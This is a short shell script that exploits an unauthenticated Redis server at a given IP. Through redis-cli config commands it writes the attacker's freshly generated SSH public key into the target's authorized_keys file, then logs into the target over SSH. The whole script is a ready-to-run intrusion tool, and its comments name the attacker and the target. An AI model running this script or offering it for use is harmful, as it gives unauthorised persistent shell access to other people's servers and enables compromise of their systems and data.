#!/usr/bin/env sh

if [ $# != 1 ] ; then
    echo "USAGE: $0 <target-ip>"
    echo "EXAMPLE: $0 127.0.0.1"
    exit 1;
fi

TARGET_IP=$1

# generate the required ssh key and add empty lines before and after to avoid mixing with other data
ssh-keygen -t rsa -C "crack@redis.io"
(echo -e "\n\n" ; cat ~/.ssh/id_rsa.pub ; echo -e "\n\n") > ~/.ssh/foo.txt

# get redis-cli in the attacker's machine
apt-get install redis

# add our public key into target's authorized_keys
cat ~/.ssh/foo.txt | redis-cli -h $TARGET_IP -x set pwn
redis-cli -h $TARGET_IP config set dir ~/.ssh
redis-cli -h $TARGET_IP config set dbfilename "authorized_keys"
redis-cli -h $TARGET_IP save

# access to target shell successfully
ssh $TARGET_IP